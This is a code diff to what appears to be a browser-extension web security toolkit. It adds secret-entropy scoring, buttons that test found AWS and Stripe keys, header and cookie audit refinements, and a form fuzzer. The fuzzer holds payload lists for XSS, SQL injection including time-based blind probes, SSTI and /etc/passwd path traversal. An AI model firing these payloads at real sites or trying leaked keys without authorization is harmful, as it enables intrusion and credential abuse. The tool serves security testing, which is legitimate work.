@@ -27,6 +27,17 @@ const SECRET_PATTERNS = [
   { name: 'Mailgun', regex: /key-[0-9a-zA-Z]{32}/g, severity: 'high' },
   { name: 'Basic Auth', regex: /[Bb]asic\s+[A-Za-z0-9+/]{20,}={0,2}/g, severity: 'medium' },
 ];
+// ═══ ENTROPY SCORING ═══
+function shannonEntropy(str) {
+  const freq = {};
+  for (const c of str) freq[c] = (freq[c] || 0) + 1;
+  const len = str.length;
+  let ent = 0;
+  for (const c in freq) { const p = freq[c] / len; ent -= p * Math.log2(p); }
+  return ent;
+}
+// Tracking cookies that are intentionally not HttpOnly
+const TRACKING_COOKIES = /^(_ga|_gid|_gat|_fbp|_fbc|_gcl_|_ym_|_hjid|_hjAbsoluteSessionInProgress|_hjFirstSeen|_hjSession|__hstc|__hssc|hubspotutk|ajs_|mp_|optimizelyEndUserId|_clck|_clsk|_uetsid|_uetvid|_pin_|_pinterest|MUID|_tt_|__qca|sc_|__gads|IDE|NID|ANID|1P_JAR|CONSENT|SOCS|AEC)$/i;
 const ENDPOINT_PATTERNS = [
   /["'](\/api\/[^"'\s]{2,})["']/g,
   /["'](\/v[0-9]+\/[^"'\s]{2,})["']/g,
@@ -82,6 +93,51 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   setupGroupToggles(); setupToolButtons(); setupPinButton(); setupDebugLog();
   setupRefreshButton(); setupScratchpad(); setupLiveBrowse();
+  // Listen for SPA navigations and DOM mutations from content/injected scripts
+  chrome.runtime.onMessage.addListener((msg) => {
+    if (!liveActive) return;
+    if (msg.type === 'SPA_NAVIGATE' && msg.payload) {
+      try {
+        const pageRoot = getRootDomain(new URL(msg.payload.url).hostname);
+        const targetRoot = getRootDomain(liveTargetDomain);
+        if (pageRoot === targetRoot) {
+          log('SPA navigate: ' + msg.payload.method + ' → ' + msg.payload.url, 'info');
+          setTimeout(() => liveScanPage(activeTabId, msg.payload.url, ''), 600);
+        }
+      } catch {}
+    }
+    if (msg.type === 'DOM_MUTATION' && msg.payload) {
+      try {
+        const pageRoot = getRootDomain(new URL(msg.payload.url).hostname);
+        const targetRoot = getRootDomain(liveTargetDomain);
+        if (pageRoot === targetRoot && (msg.payload.forms > 0 || msg.payload.scripts > 0)) {
+          log('DOM mutation: ' + msg.payload.forms + ' forms, ' + msg.payload.scripts + ' scripts', 'info');
+          setTimeout(() => liveScanPage(activeTabId, msg.payload.url, ''), 400);
+        }
+      } catch {}
+    }
+    if (msg.type === 'INTERCEPTED_REQUEST' && msg.payload) {
+      try {
+        const reqUrl = msg.payload.url;
+        if (!reqUrl) return;
+        const reqRoot = getRootDomain(new URL(reqUrl, activeTabUrl).hostname);
+        const targetRoot = getRootDomain(liveTargetDomain);
+        if (reqRoot === targetRoot) {
+          const key = 'xhr:' + msg.payload.method + ':' + reqUrl;
+          if (!liveSeenItems.has(key)) {
+            liveSeenItems.add(key);
+            const feed = document.getElementById('live-feed');
+            const ts = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.style.cssText = 'padding:3px 10px;border-bottom:1px solid var(--border);font-size:10px;font-family:var(--font-mono);color:var(--text-secondary)';
+            div.textContent = ts + ' ' + msg.payload.type.toUpperCase() + ' ' + (msg.payload.method || 'GET') + ' ' + reqUrl.slice(0, 80);
+            if (feed.firstChild?.classList?.contains('text-muted')) feed.innerHTML = '';
+            feed.prepend(div);
+          }
+        }
+      } catch {}
+    }
+  });
   // Global click-to-copy on result items
   document.querySelector('.app').addEventListener('click', (e) => {
     // Click-to-copy: clicking a result-item copies its value text
@@ -94,6 +150,16 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (e.target.dataset.testKey) {
       e.stopPropagation();
       window.testGoogleKey(e.target.dataset.testKey);
+    }
+    // Test AWS key button
+    if (e.target.dataset.testAws) {
+      e.stopPropagation();
+      window.testAwsKey(e.target.dataset.testAws);
+    }
+    // Test Stripe key button
+    if (e.target.dataset.testStripe) {
+      e.stopPropagation();
+      window.testStripeKey(e.target.dataset.testStripe);
     }
   });
 
@@ -329,6 +395,21 @@ function setupPinButton() {
 }
 function setupRefreshButton() {
   document.getElementById('btn-refresh').addEventListener('click', () => { Object.keys(cache).forEach(k => delete cache[k]); updateActiveTab(); });
+  // Quick Audit — runs the 5 most critical tools in sequence
+  document.getElementById('btn-quick-audit')?.addEventListener('click', async () => {
+    const btn = document.getElementById('btn-quick-audit');
+    btn.disabled = true; btn.textContent = 'Scanning…';
+    const tools = ['headers-audit', 'secrets', 'passive', 'cookies', 'tech-stack'];
+    for (let i = 0; i < tools.length; i++) {
+      btn.textContent = `${i + 1}/${tools.length}…`;
+      try { await runTool(tools[i]); } catch {}
+      // Open the relevant group
+      const toolBtn = document.querySelector(`[data-tool="${tools[i]}"]`);
+      if (toolBtn) toolBtn.closest('.feat-group')?.classList.add('open');
+    }
+    btn.disabled = false; btn.textContent = 'Quick Audit';
+    log('Quick Audit complete: ' + tools.length + ' tools', 'success');
+  });
   // Reset button — close all panels, clear cache for current domain
   document.getElementById('btn-reset')?.addEventListener('click', () => {
     const currentHost = activeTabDomain;
@@ -502,6 +583,17 @@ async function toolTechStack() {
     if (h.name.toLowerCase()==='x-powered-by') srv.push({name:h.value,category:'Backend',confidence:'high'});
   });
   const all = [...(res?.data||[]), ...srv];
+  // Enhanced: detect framework globals from main world
+  try {
+    const globalsRes = await msgTab({ type: 'DETECT_GLOBALS' });
+    if (globalsRes?.ok && globalsRes.data) {
+      globalsRes.data.forEach(g => {
+        if (!all.some(t => t.name.toLowerCase().includes(g.name.toLowerCase()))) {
+          all.push({ name: g.name + (g.detail ? ' (' + g.detail + ')' : ''), category: 'Framework', confidence: 'high' });
+        }
+      });
+    }
+  } catch {}
   const attackHints = {
     'WordPress': 'Try: /wp-json/wp/v2/users, xmlrpc.php brute force, plugin vulns',
     'Next.js': 'Try: /_next/data paths, API routes, SSRF via image optimization',
@@ -546,9 +638,9 @@ async function toolHeadersAudit() {
   const csp = hd['content-security-policy'];
   if (csp) {
     score += 10;
-    if (csp.includes("'unsafe-inline'")) findings.push({ sev: 'high', text: "CSP allows 'unsafe-inline' — XSS protection bypassed" });
-    else if (csp.includes("'unsafe-eval'")) findings.push({ sev: 'high', text: "CSP allows 'unsafe-eval' — code injection possible" });
-    else if (csp.includes('*')) findings.push({ sev: 'medium', text: "CSP contains wildcard (*) — overly permissive" });
+    if (csp.includes("'unsafe-inline'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-inline' — XSS protection bypassed" }); score -= 5; }
+    else if (csp.includes("'unsafe-eval'")) { findings.push({ sev: 'high', text: "CSP allows 'unsafe-eval' — code injection possible" }); score -= 5; }
+    else if (csp.includes('*')) { findings.push({ sev: 'medium', text: "CSP contains wildcard (*) — overly permissive" }); score -= 3; }
     else score += 5;
     if (/cdn\.jsdelivr|cdnjs\.cloudflare|unpkg\.com/.test(csp)) findings.push({ sev: 'medium', text: 'CSP trusts CDNs (jsdelivr/cdnjs/unpkg) — known bypass vectors' });
   } else { findings.push({ sev: 'high', text: 'No Content-Security-Policy — no XSS protection' }); }
@@ -559,13 +651,19 @@ async function toolHeadersAudit() {
     score += 10;
     const maxAge = hsts.match(/max-age=(\d+)/);
     if (maxAge && parseInt(maxAge[1]) < 31536000) findings.push({ sev: 'medium', text: `HSTS max-age=${maxAge[1]} (< 1 year) — too short` });
-    if (maxAge && parseInt(maxAge[1]) === 0) findings.push({ sev: 'high', text: 'HSTS max-age=0 — HSTS disabled!' });
+    if (maxAge && parseInt(maxAge[1]) === 0) { findings.push({ sev: 'high', text: 'HSTS max-age=0 — HSTS disabled!' }); score -= 10; }
     if (!hsts.includes('includeSubDomains')) findings.push({ sev: 'low', text: 'HSTS missing includeSubDomains' });
     else score += 5;
   } else { findings.push({ sev: 'high', text: 'No HSTS — MITM downgrade possible' }); }
 
-  // X-Frame-Options
-  if (hd['x-frame-options']) { score += 10; } else {
+  // X-Frame-Options — validate value
+  const xfo = hd['x-frame-options'];
+  if (xfo) {
+    const val = xfo.toLowerCase();
+    if (val === 'deny' || val === 'sameorigin') { score += 10; }
+    else if (val === 'allowall' || val === 'allow-from') { findings.push({ sev: 'medium', text: `X-Frame-Options: ${xfo} — weak or deprecated value` }); score += 3; }
+    else { findings.push({ sev: 'low', text: `X-Frame-Options: ${xfo} — non-standard value` }); score += 5; }
+  } else {
     const cspFrame = csp && (csp.includes('frame-ancestors') || csp.includes("frame-src 'none'"));
     if (!cspFrame) findings.push({ sev: 'medium', text: 'No X-Frame-Options or frame-ancestors — clickjacking possible' });
     else score += 10;
@@ -619,9 +717,9 @@ async function toolCookies() {
       if (c.name.includes(pattern) || c.name.startsWith(pattern)) { if (!detectedTech.includes(tech)) detectedTech.push(tech); }
     }
     if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(c.value)) jwtCookies.push(c.name);
-    if (!c.httpOnly) securityIssues.push(`${c.name}: missing HttpOnly`);
+    if (!c.httpOnly && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: missing HttpOnly`);
     if (!c.secure) securityIssues.push(`${c.name}: missing Secure`);
-    if (c.sameSite === 'unspecified' || c.sameSite === 'none') securityIssues.push(`${c.name}: SameSite=${c.sameSite || 'unspecified'}`);
+    if ((c.sameSite === 'unspecified' || c.sameSite === 'none') && !TRACKING_COOKIES.test(c.name)) securityIssues.push(`${c.name}: SameSite=${c.sameSite || 'unspecified'}`);
     if (c.expirationDate) {
       const daysUntilExpiry = Math.floor((c.expirationDate * 1000 - Date.now()) / 86400000);
       if (daysUntilExpiry > 365) securityIssues.push(`${c.name}: expires in ${daysUntilExpiry} days (excessive)`);
@@ -671,6 +769,7 @@ async function toolCookies() {
 
   // Test auth button — tests each cookie individually
   b.querySelector('#btn-test-auth')?.addEventListener('click', async () => {
+    if (!confirm('This test temporarily removes cookies one by one to identify which are needed for authentication.\n\nYour session should be restored after the test, but in rare cases the server may invalidate the session.\n\nProceed?')) return;
     const btn = b.querySelector('#btn-test-auth');
     btn.textContent = `Testing ${cookies.length} cookies…`; btn.disabled = true;
     const r = await chrome.runtime.sendMessage({ type: 'TEST_AUTH', url: activeTabUrl, domain: activeTabDomain });
@@ -957,8 +1056,10 @@ async function toolSecrets() {
     (findings.length===0 ? '<div class="text-muted text-sm">No secrets detected</div>' :
     findings.slice(0,50).map(f => {
       const isGoogleKey = f.name === 'Google API Key';
+      const isAwsKey = f.name === 'AWS Access Key';
+      const isStripeKey = f.name === 'Stripe Secret';
       return `<div class="result-item ${f.severity}" style="cursor:pointer">
-      <div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span>${esc(f.name)}${isGoogleKey ? ` <button class="btn-sm" data-test-key="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test Key</button>` : ''}</div>
+      <div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span>${esc(f.name)}${isGoogleKey ? ` <button class="btn-sm" data-test-key="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test Key</button>` : ''}${isAwsKey ? ` <button class="btn-sm" data-test-aws="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test AWS</button>` : ''}${isStripeKey ? ` <button class="btn-sm" data-test-stripe="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test Stripe</button>` : ''}<span class="text-xs text-muted" style="margin-left:4px">H=${f.entropy || '?'}</span></div>
       <div class="result-value">${esc(f.match.slice(0,80))}</div>
       ${f.context ? `<div style="margin-top:3px;padding:3px 6px;background:var(--surface-hover);border-radius:3px;font-family:var(--font-mono);font-size:9px;color:var(--text-tertiary);max-height:36px;overflow:hidden">…${esc(f.context)}…</div>` : ''}
       <div class="text-xs text-muted">Found in: ${esc(f.source)}</div>
@@ -968,29 +1069,42 @@ async function toolSecrets() {
 function scanSecrets(text,source,findings){
   // Skip third-party libraries that generate tons of false positives
   if (/openpgp\.min\.js|cookiehub\.net|google-analytics|googletagmanager/.test(source)) return;
+  // Content-based library detection: skip crypto libraries by content signature
+  if (text.length > 5000 && /BEGIN PGP|PRIVATE KEY.*ENCRYPTED|secp256k1|ed25519.*curve/i.test(text.slice(0, 2000))) return;
   for(const p of SECRET_PATTERNS){const re=new RegExp(p.regex.source,p.regex.flags);let m;while((m=re.exec(text))!==null){const v=m[1]||m[0];if(v.length<8)continue;
+  // Entropy check: skip low-entropy matches (repeated chars, sequential)
+  if(p.severity==='high'||p.severity==='medium'){
+    const ent=shannonEntropy(v);
+    if(ent<2.5&&p.name!=='Private Key')continue; // Very low entropy = likely placeholder
+  }
   // IP Address false positive filters
   if(p.name==='IP Address'){
     if(v.startsWith('0.')||v.startsWith('127.')||v.startsWith('10.')||v.startsWith('192.168.'))continue;
-    // Leading zeros = not a real IP (OIDs like 045.3.1.7)
     if(/\b0\d/.test(v))continue;
-    // Context: check surrounding chars for SVG path data (l.87.75.22.19 = SVG, not IP)
     const before=text.slice(Math.max(0,m.index-5),m.index);
     if(/[,\-lmcsqtaLMCSQTA]\s*\.?\d*\.?$/.test(before))continue;
-    // Context: OID strings ("1.2.840.10045.3.1.7":"p256")
     const around=text.slice(Math.max(0,m.index-30),Math.min(text.length,m.index+v.length+30));
     if(/["'][0-9.]+["']\s*:|curve|secp|brainpool|p256|p384|p521|oid/i.test(around))continue;
   }
   // Generic Secret false positive filters
   if(p.name==='Generic Secret'){
     if(/%filtered%|%redacted%|\[FILTERED\]|\[REDACTED\]|placeholder|example|test123|changeme|YOUR_|TODO|FIXME/i.test(v))continue;
-    // Skip CDN/third-party sources
     if(/cdnjs\.cloudflare|cdn\.jsdelivr|fonts\.googleapis/.test(source))continue;
+  }
+  // Bearer token filter: skip documentation examples
+  if(p.name==='Bearer Token'){
+    const around=text.slice(Math.max(0,m.index-40),Math.min(text.length,m.index+v.length+40));
+    if(/example|placeholder|YOUR_TOKEN|INSERT_TOKEN|TODO|header|authorization.*:/i.test(around))continue;
+  }
+  // Twilio SK filter: verify it's not a random hex substring
+  if(p.name==='Twilio API Key'){
+    const around=text.slice(Math.max(0,m.index-10),Math.min(text.length,m.index+v.length+10));
+    if(/[0-9a-f]{40,}/i.test(around))continue; // Part of a longer hash
   }
   if(!findings.some(f=>f.match===v)){
     const start=Math.max(0,m.index-80);const end=Math.min(text.length,m.index+v.length+80);
     const ctx=text.slice(start,end).replace(/\n/g,' ').trim();
-    findings.push({name:p.name,match:v,severity:p.severity,source,context:ctx})
+    findings.push({name:p.name,match:v,severity:p.severity,source,context:ctx,entropy:shannonEntropy(v).toFixed(1)})
   }}}
 }
 
@@ -1220,14 +1334,21 @@ async function toolCors() {
     if (!r.ok) { o.innerHTML = errMsg('Failed'); return; }
     const criticals = r.results.filter(x => x.critical);
     const vulns = r.results.filter(x => x.vuln);
-    o.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tested</span><span class="text-sm ${criticals.length?'text-accent':''}" style="font-weight:700">${criticals.length} critical, ${vulns.length} reflected</span></div>` +
+    const wildcardOnly = r.results.filter(x => x.wildcardOnly);
+    let preflightHtml = '';
+    if (r.preflight) {
+      const pf = r.preflight;
+      preflightHtml = `<div class="result-item ${pf.error ? 'info' : 'low'}" style="margin-bottom:8px"><div class="result-label">Preflight (OPTIONS)</div><div class="result-value">${pf.error ? 'Error: ' + esc(pf.error) : `Status: ${pf.status} | ACAO: ${esc(pf.acao || 'none')} | Methods: ${esc(pf.methods || 'none')}`}</div></div>`;
+    }
+    o.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tested</span><span class="text-sm ${criticals.length?'text-accent':''}" style="font-weight:700">${criticals.length} critical, ${vulns.length} reflected</span></div>${preflightHtml}` +
       r.results.map(x => {
-        const sev = x.critical ? 'high' : x.vuln ? 'medium' : 'info';
+        const sev = x.critical ? 'high' : x.vuln ? 'medium' : x.wildcardOnly ? 'low' : 'info';
         return `<div class="result-item ${sev}">
-          <div class="result-label"><span class="result-tag tag-${sev}">${x.critical ? 'CRIT' : x.vuln ? 'VULN' : x.status || 'OK'}</span> ${esc(x.label)}</div>
+          <div class="result-label"><span class="result-tag tag-${sev}">${x.critical ? 'CRIT' : x.vuln ? 'VULN' : x.wildcardOnly ? 'WILD' : x.status || 'OK'}</span> ${esc(x.label)}</div>
           <div class="result-value">Origin: ${esc(x.origin)}<br>ACAO: ${esc(x.acao || 'none')} | ACAC: ${esc(x.acac || 'none')}</div>
-          ${x.critical ? '<div class="text-xs text-accent" style="font-weight:600">⚠ Origin reflected WITH credentials — exploitable CORS!</div>' : ''}
+          ${x.critical ? '<div class="text-xs text-accent" style="font-weight:600">Origin reflected WITH credentials — exploitable CORS!</div>' : ''}
           ${x.vuln && !x.critical ? '<div class="text-xs" style="color:var(--warning)">Origin reflected (no credentials — lower impact)</div>' : ''}
+          ${x.wildcardOnly ? '<div class="text-xs text-muted">Wildcard (*) without credentials — common for public APIs, generally safe</div>' : ''}
         </div>`;
       }).join('');
     finalizeResults('offensive');
@@ -1372,47 +1493,193 @@ async function toolParamFuzz() {
   const b = showResults('offensive', 'Param Fuzzer', false);
   const u = new URL(activeTabUrl);
   const params = [...u.searchParams.keys()];
-  b.innerHTML = `<div class="text-sm mb-6">${params.length ? params.length + ' params: ' + params.map(esc).join(', ') : 'No URL params found'}</div>
-    <div class="tool-input-row"><input class="tool-input" id="fz-url" value="${esc(activeTabUrl)}" placeholder="URL with params"></div>
-    <div class="codec-row mb-4">
-      <button class="btn-sm primary" data-fzcat="xss">XSS</button>
-      <button class="btn-sm" data-fzcat="sqli">SQLi</button>
-      <button class="btn-sm" data-fzcat="ssti">SSTI</button>
-      <button class="btn-sm" data-fzcat="path">Path Traversal</button>
+
+  // Auto-detect forms on the page
+  let pageForms = [];
+  try {
+    const fr = await msgTab({ type: 'EXTRACT_FORMS' });
+    if (fr?.ok) pageForms = fr.data.filter(f => f.fields.length > 0);
+  } catch {}
+  const fuzzableFields = pageForms.reduce((sum, f) => sum + f.fields.filter(fi => fi.name && fi.type !== 'hidden' && fi.type !== 'submit' && fi.type !== 'button').length, 0);
+
+  b.innerHTML = `
+    <div class="codec-row mb-4" style="border-bottom:1px solid var(--border);padding-bottom:8px">
+      <button class="btn-sm ${params.length ? 'primary' : ''}" id="fz-mode-url" style="font-weight:700">URL Params (${params.length})</button>
+      <button class="btn-sm ${pageForms.length ? '' : ''}" id="fz-mode-form" style="font-weight:700">Form Fields (${fuzzableFields})</button>
     </div>
-    <details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom payloads</summary>
-      <textarea class="tool-input mt-4" id="fz-custom" rows="3" placeholder="One payload per line. Use with any category button — these will be tested IN ADDITION to the built-in payloads."></textarea>
-      <div class="text-xs text-muted mt-4">Tip: target specific params by editing the URL above</div>
-    </details>
-    <div id="fz-out"></div>`;
-  b.querySelectorAll('[data-fzcat]').forEach(btn => btn.addEventListener('click', async () => {
-    const out = b.querySelector('#fz-out');
-    const url = b.querySelector('#fz-url').value;
-    const cat = btn.dataset.fzcat;
-    const customPayloads = (b.querySelector('#fz-custom')?.value || '').split('\n').map(s => s.trim()).filter(Boolean);
-    out.innerHTML = `<div class="loading-text"><span class="spinner"></span> Fuzzing ${cat.toUpperCase()}${customPayloads.length ? ' + ' + customPayloads.length + ' custom' : ''}…</div>`;
-    const r = await chrome.runtime.sendMessage({ type: 'PARAM_FUZZ', url, category: cat, customPayloads });
-    if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
-    if (r.message) { out.innerHTML = `<div class="text-muted text-sm">${esc(r.message)}</div>`; return; }
+    <div id="fz-mode-content"></div>`;
+
+  const renderUrlMode = () => {
+    const mc = b.querySelector('#fz-mode-content');
+    mc.innerHTML = `<div class="text-sm mb-6">${params.length ? params.length + ' params: ' + params.map(esc).join(', ') : '<span style="color:var(--warning)">No URL params found. Add ?param=value to the URL, or switch to Form Fields mode.</span>'}</div>
+      <div class="tool-input-row"><input class="tool-input" id="fz-url" value="${esc(activeTabUrl)}" placeholder="URL with params"></div>
+      <div class="codec-row mb-4">
+        <button class="btn-sm primary" data-fzcat="xss">XSS</button>
+        <button class="btn-sm" data-fzcat="sqli">SQLi + Blind</button>
+        <button class="btn-sm" data-fzcat="ssti">SSTI</button>
+        <button class="btn-sm" data-fzcat="path">Path Traversal</button>
+      </div>
+      <details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom payloads</summary>
+        <textarea class="tool-input mt-4" id="fz-custom" rows="3" placeholder="One payload per line"></textarea>
+      </details>
+      <div id="fz-out"></div>`;
+    mc.querySelectorAll('[data-fzcat]').forEach(btn => btn.addEventListener('click', async () => {
+      const out = mc.querySelector('#fz-out');
+      const url = mc.querySelector('#fz-url').value;
+      const cat = btn.dataset.fzcat;
+      const customPayloads = (mc.querySelector('#fz-custom')?.value || '').split('\n').map(s => s.trim()).filter(Boolean);
+      const isBlind = cat === 'sqli';
+      out.innerHTML = `<div class="loading-text"><span class="spinner"></span> Fuzzing ${cat.toUpperCase()}${isBlind ? ' (includes time-based blind - may take longer)' : ''}…</div><div class="fz-progress" style="height:3px;background:var(--border);border-radius:2px;margin-top:8px;overflow:hidden"><div id="fz-bar" style="height:100%;width:0%;background:var(--accent);transition:width 0.3s"></div></div>`;
+      const r = await chrome.runtime.sendMessage({ type: 'PARAM_FUZZ', url, category: cat, customPayloads });
+      if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
+      if (r.message) { out.innerHTML = `<div class="text-muted text-sm">${esc(r.message)}</div>`; return; }
+      renderFuzzResults(out, r, 'url');
+      finalizeResults('offensive');
+    }));
+  };
+
+  const renderFormMode = () => {
+    const mc = b.querySelector('#fz-mode-content');
+    if (!pageForms.length) {
+      mc.innerHTML = '<div class="text-muted text-sm">No forms detected on this page. Navigate to a page with login, search, or other input forms.</div>';
+      return;
+    }
+    mc.innerHTML = `<div class="text-sm mb-6">${pageForms.length} form${pageForms.length > 1 ? 's' : ''} detected</div>` +
+      pageForms.map((f, i) => {
+        const fuzzableF = f.fields.filter(fi => fi.name && fi.type !== 'submit' && fi.type !== 'button');
+        const hasPassword = f.fields.some(fi => fi.type === 'password');
+        const hasFile = f.fields.some(fi => fi.type === 'file');
+        const label = hasPassword ? '🔐 Login Form' : hasFile ? '📁 File Upload' : '📝 Form';
+        return `<div class="result-item ${hasPassword ? 'medium' : 'info'}" style="cursor:pointer" data-form-idx="${i}">
+          <div class="result-label">${label} — ${esc(f.method?.toUpperCase() || 'GET')} → ${esc(f.action || '(self)')}</div>
+          <div class="result-value">${fuzzableF.map(fi => `<span style="display:inline-block;padding:1px 5px;margin:1px;background:var(--surface-hover);border:1px solid var(--border);border-radius:3px;font-size:9px">${esc(fi.name)} <span class="text-muted">${fi.type||'text'}</span></span>`).join('')}</div>
+          <div class="text-xs text-muted mt-4">${fuzzableF.length} testable field${fuzzableF.length > 1 ? 's' : ''}${f.fields.filter(fi => fi.type === 'hidden').length ? ' + ' + f.fields.filter(fi => fi.type === 'hidden').length + ' hidden' : ''}</div>
+        </div>`;
+      }).join('') +
+      `<div id="fz-form-detail" style="display:none;margin-top:10px">
+        <div class="result-label mb-4" id="fz-form-label">Selected form</div>
+        <div class="codec-row mb-4">
+          <button class="btn-sm primary" data-ffcat="xss">XSS</button>
+          <button class="btn-sm" data-ffcat="sqli">SQLi + Blind</button>
+          <button class="btn-sm" data-ffcat="ssti">SSTI</button>
+          <button class="btn-sm" data-ffcat="path">Path Traversal</button>
+        </div>
+        <div class="text-xs text-muted mb-6">Payloads will be submitted through each form field via ${pageForms[0]?.method?.toUpperCase() || 'GET'}. Other fields keep their default values.</div>
+        <div id="fz-form-out"></div>
+      </div>`;
+
+    let selectedFormIdx = -1;
+    mc.querySelectorAll('[data-form-idx]').forEach(el => el.addEventListener('click', () => {
+      selectedFormIdx = +el.dataset.formIdx;
+      const f = pageForms[selectedFormIdx];
+      const det = mc.querySelector('#fz-form-detail');
+      det.style.display = 'block';
+      mc.querySelector('#fz-form-label').textContent = `Fuzzing: ${f.method?.toUpperCase() || 'GET'} → ${f.action || '(self)'}`;
+      // Highlight selected
+      mc.querySelectorAll('[data-form-idx]').forEach(x => x.style.outline = '');
+      el.style.outline = '2px solid var(--accent)';
+    }));
+
+    mc.querySelectorAll('[data-ffcat]').forEach(btn => btn.addEventListener('click', async () => {
+      if (selectedFormIdx < 0) { alert('Select a form first'); return; }
+      const f = pageForms[selectedFormIdx];
+      const cat = btn.dataset.ffcat;
+      const out = mc.querySelector('#fz-form-out');
+      const isBlind = cat === 'sqli';
+      out.innerHTML = `<div class="loading-text"><span class="spinner"></span> Fuzzing ${f.fields.length} fields with ${cat.toUpperCase()}${isBlind ? ' (includes blind timing)' : ''}…</div><div style="height:3px;background:var(--border);border-radius:2px;margin-top:8px;overflow:hidden"><div style="height:100%;width:30%;background:var(--accent);animation:fz-pulse 2s ease-in-out infinite"></div></div>`;
+
+      // Build payload list for this category
+      const payloadSets = {
+        xss: [
+          { p: '<script>alert(1)</script>', check: 'unencoded_html' },
+          { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
+          { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
+          { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
+          { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
+        ],
+        sqli: [
+          { p: "' OR '1'='1", check: 'sqli_error' },
+          { p: "' UNION SELECT NULL--", check: 'sqli_error' },
+          { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
+          { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
+          { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
+          { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
+        ],
+        ssti: [
+          { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925558641' },
+          { p: '${9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
+        ],
+        path: [
+          { p: '../../../etc/passwd', check: 'file_content' },
+          { p: '....//....//etc/passwd', check: 'file_content' },
+        ],
+      };
+      const testFields = f.fields.filter(fi => fi.name && fi.type !== 'submit' && fi.type !== 'button');
+      const action = f.action || activeTabUrl;
+      const r = await chrome.runtime.sendMessage({
+        type: 'FUZZ_FORM', action, method: f.method || 'GET',
+        fields: testFields, payloads: payloadSets[cat] || payloadSets.xss, category: cat
+      });
+      if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
+      renderFuzzResults(out, r, 'form');
+      finalizeResults('offensive');
+    }));
+  };
+
+  // Render results (shared between URL and Form modes)
+  const renderFuzzResults = (out, r, mode) => {
     const critical = r.results.filter(x => x.severity === 'high');
     const warnings = r.results.filter(x => x.severity === 'medium' || x.severity === 'low');
-    out.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tests${r.baselineLen ? ' · baseline: ' + r.baselineLen + 'b' : ''}</span><span class="text-sm"><span class="${critical.length ? 'text-accent' : 'text-muted'}" style="font-weight:700">${critical.length} critical</span>, ${warnings.length} warnings</span></div>` +
-      r.results.map(x => {
+    const fieldKey = mode === 'form' ? 'field' : 'param';
+    out.innerHTML = `<div class="flex-between mb-6">
+        <span class="text-sm">${r.results.length} tests${r.testedPayloads ? ' (' + r.testedPayloads + '/' + r.totalPayloads + ' payloads)' : ''}${r.baselineLen ? ' · baseline: ' + r.baselineLen + 'b' : ''}${r.baselineTime ? ' · ' + (r.baselineTime / 1000).toFixed(1) + 's' : ''}${r.method ? ' · ' + r.method : ''}</span>
+        <span class="text-sm"><span class="${critical.length ? 'text-accent' : 'text-muted'}" style="font-weight:700">${critical.length} critical</span>, ${warnings.length} warnings</span>
+      </div>
+      <div class="codec-row mb-4"><button class="btn-sm" id="fz-show-all">All (${r.results.length})</button><button class="btn-sm" id="fz-show-vuln">Findings (${critical.length + warnings.length})</button><button class="btn-sm" id="fz-show-safe">Safe (${r.results.filter(x => x.severity === 'safe').length})</button></div>
+      <div id="fz-results-list"></div>`;
+
+    const renderList = (filter) => {
+      const items = filter === 'vuln' ? r.results.filter(x => x.severity !== 'safe' && x.severity !== 'info')
+        : filter === 'safe' ? r.results.filter(x => x.severity === 'safe')
+        : r.results;
+      out.querySelector('#fz-results-list').innerHTML = items.map(x => {
         const sevColor = x.severity === 'high' ? 'high' : x.severity === 'medium' ? 'medium' : x.severity === 'low' ? 'low' : 'info';
         const tagClass = x.severity === 'high' ? 'tag-high' : x.severity === 'medium' ? 'tag-medium' : x.severity === 'low' ? 'tag-low' : 'tag-safe';
         const tagText = x.severity === 'high' ? 'VULN' : x.severity === 'medium' ? 'WARN' : x.severity === 'low' ? 'NOTE' : 'SAFE';
+        const target = x[fieldKey] || x.field || x.param || '?';
         return `<div class="result-item ${sevColor}" style="cursor:pointer">
-          <div class="result-label"><span class="result-tag ${tagClass}">${tagText}</span> ${esc(x.param)}</div>
+          <div class="result-label"><span class="result-tag ${tagClass}">${tagText}</span> ${esc(target)}${x.fieldType ? ' <span class="text-muted">[' + esc(x.fieldType) + ']</span>' : ''}</div>
           <div class="result-value" style="margin-bottom:3px">${esc(x.payload)}</div>
           <div class="text-xs" style="color:var(--text-secondary);margin-bottom:2px">${esc(x.analysis)}</div>
-          ${x.status ? `<div class="text-xs text-muted">HTTP ${x.status} · ${x.bodyLen} bytes</div>` : ''}
+          ${x.status ? `<div class="text-xs text-muted">HTTP ${x.status} · ${x.bodyLen}b${x.elapsed ? ' · ' + (x.elapsed / 1000).toFixed(1) + 's' : ''}</div>` : ''}
